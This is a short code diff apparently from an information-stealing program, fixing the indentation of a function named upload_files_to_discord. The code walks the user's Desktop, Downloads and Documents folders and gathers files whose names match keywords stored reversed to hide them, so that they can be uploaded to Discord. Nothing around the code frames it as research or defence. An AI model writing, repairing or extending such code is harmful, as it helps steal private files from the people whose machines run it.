@@ -814,13 +814,13 @@ def upload_files_to_discord():
     documents_path = os.path.expanduser("~/Documents")
 
     file_paths = []
-        for path in [desktop_path, downloads_path, documents_path]:
-            try:
-                for file in os.listdir(path):
-                    if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                        file_path = os.path.join(path, file) 
-                        file_paths.append(file_path)
-            except:pass
+    for path in [desktop_path, downloads_path, documents_path]:
+        try:
+            for file in os.listdir(path):
+                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                    file_path = os.path.join(path, file) 
+                    file_paths.append(file_path)
+        except:pass
         urls = []
     
         with concurrent.futures.ThreadPoolExecutor() as executor:
